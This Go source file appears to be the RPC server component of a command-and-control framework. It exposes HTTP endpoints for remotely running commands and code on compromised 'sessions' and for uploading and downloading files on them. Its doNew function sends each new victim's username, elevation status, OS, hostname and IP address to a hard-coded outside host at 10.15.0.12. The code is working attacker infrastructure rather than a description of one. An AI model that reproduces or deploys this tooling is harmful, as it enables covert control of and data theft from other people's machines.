package rpc

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/PurpleSec/routex"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

const (
	prefix = `^/api/v1`

	expire  = time.Hour * 2
	timeout = time.Second * 10
)

var buffers = sync.Pool{
	New: func() interface{} {
		return new(data.Chunk)
	},
}

// Server is the struct that handles the C2 RPC server interface and submits the control requests.
type Server struct {
	Key     string
	Timeout time.Duration

	c      *c2.Server
	mux    *routex.Mux
	ctx    context.Context
	lock   sync.Mutex
	hash   map[string]device.ID
	jobs   map[uint32]cache
	cancel context.CancelFunc
	http.Server
}
type cache map[uint16]*c2.Job

func (r *Server) prune() {
	t := time.NewTicker(time.Minute)
	for {
		select {
		case n := <-t.C:
			r.lock.Lock()
			var (
				w = n.Add(-(expire))
				q []uint32
			)
			for i, s := range r.jobs {
				for e, j := range s {
					if w.Sub(j.Start) > expire {
						delete(s, e)
					}
				}
				if len(s) == 0 {
					q = append(q, i)
				}
			}
			for i := range q {
				delete(r.jobs, q[i])
			}
			r.lock.Unlock()
		case <-r.ctx.Done():
			t.Stop()
			return
		}

	}
}

// New creates a new RPC server instance using the resulting C2 Server.
func New(c *c2.Server) *Server {
	return NewContext(context.Background(), c)
}
func (r *Server) complete(j *c2.Job) {
	if j.Status < c2.Completed {
		return
	}
	r.lock.Lock()
	var (
		h     = j.Session.ID.Hash()
		t, ok = r.jobs[h]
	)
	if !ok {
		t = make(cache, 1)
		r.jobs[h] = t
	}
	t[j.ID] = j
	r.lock.Unlock()
}
func setup(s *Server, m *routex.Mux) {
	m.MustMethod("sessions", http.MethodGet, prefix+`/session$`, routex.Func(s.httpSessionsGet))
	m.MustMethod("listeners", http.MethodGet, prefix+`/listener$`, routex.Func(s.httpListenersGet))
	m.Must("session_job", prefix+`/session/(?P<session>[a-zA-Z0-9]+)/(?P<job>[0-9]+)$`, routex.Func(s.httpJob))
	m.MustMethod("session", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)$`, routex.Func(s.httpSessionGet))
	m.MustMethod("listener", http.MethodGet, prefix+`/listener/(?P<listener>[a-zA-Z0-9]+)$`, routex.Func(s.httpListenerGet))
	m.MustMethod("session_jobs", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/job$`, routex.Func(s.httpJobsGet))
	m.MustMethod("session_result", http.MethodGet, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/(?P<job>[0-9]+)/result$`, routex.Func(s.httpJobResultGet))
	m.MustMethod("session_upload", http.MethodPut, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/upload$`, routex.Wrap(valUpload, routex.FuncWrap(s.httpUploadPut)))
	m.MustMethod("session_exec", http.MethodPut, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/exec$`, routex.Wrap(valSessionCmd, routex.FuncWrap(s.httpSessionExecPut)))
	m.MustMethod("session_code", http.MethodPut, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/code$`, routex.Wrap(valSessionCode, routex.FuncWrap(s.httpSessionCodePut)))
	m.MustMethod("session_download", http.MethodPut, prefix+`/session/(?P<session>[a-zA-Z0-9]+)/download$`, routex.Wrap(valDownload, routex.FuncWrap(s.httpDownloadPut)))
}

// Listen will bind to the specified address and begin serving requests.
// This function will return when the server is closed.
func (r *Server) Listen(addr string) error {
	return r.ListenTLS(addr, "", "")
}
func (r *Server) session(n string) *c2.Session {
	if r.lock.Lock(); len(r.hash) > 0 {
		i, ok := r.hash[n]
		if ok {
			r.lock.Unlock()
			return r.c.Session(i)
		}
	}
	for _, v := range r.c.Connected() {
		h := v.ID.String()
		if r.hash[h] = v.ID; h == n {
			r.lock.Unlock()
			return v
		}
	}
	r.lock.Unlock()
	return nil
}
func (r *Server) context(_ net.Listener) context.Context {
	return r.ctx
}

// ListenTLS will bind to the specified address and use the provided certificate and key file paths
// to listen using a secure TLS tunnel. This function will return when the server is closed.
func (r *Server) ListenTLS(addr, cert, key string) error {
	r.Server.Addr, r.Server.BaseContext = addr, r.context
	r.Server.ReadTimeout, r.Server.IdleTimeout = r.Timeout, r.Timeout
	r.Server.WriteTimeout, r.Server.ReadHeaderTimeout = r.Timeout, r.Timeout
	go r.prune()
	if len(cert) == 0 || len(key) == 0 {
		return r.Server.ListenAndServe()
	}
	r.Server.TLSConfig = &tls.Config{
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		CurvePreferences:         []tls.CurveID{tls.CurveP256, tls.X25519},
		PreferServerCipherSuites: true,
	}
	return r.Server.ListenAndServeTLS(cert, key)
}

// NewContext creates a new RPC server instance using the resulting C2 Server. This function
// allows specifying a Context to aid in cancelation.
func NewContext(x context.Context, c *c2.Server) *Server {
	r := &Server{
		c:       c,
		mux:     routex.New(),
		hash:    make(map[string]device.ID),
		jobs:    make(map[uint32]cache),
		Timeout: timeout,
	}
	if r.Timeout == 0 {
		r.Timeout = time.Second * 15
	}
	r.Server.Handler = r.mux
	r.ctx, r.cancel = context.WithCancel(x)
	r.mux.Error = routex.FuncError(errors)
	setup(r, r.mux)
	for _, l := range c.Listeners() {
		l.New = doNew
	}
	return r
}

func doNew(s *c2.Session) {
	var v string
	for _, n := range s.Device.Network {
		for _, a := range n.Address {
			if a.IsZero() || a.IsLinkLocalUnicast() || a.IsLoopback() {
				continue
			}
			v = a.String()
			break
		}
	}
	d := map[string]string{
		"username":  s.Device.User,
		"os":        s.Device.Version,
		"hostname":  s.Device.Hostname,
		"ipaddress": v,
	}
	if s.Device.Elevated {
		d["username"] = "*" + d["username"]
	}
	b, _ := json.Marshal(d)
	http.Post("http://10.15.0.12/client", "application/json", bytes.NewReader(b))
}
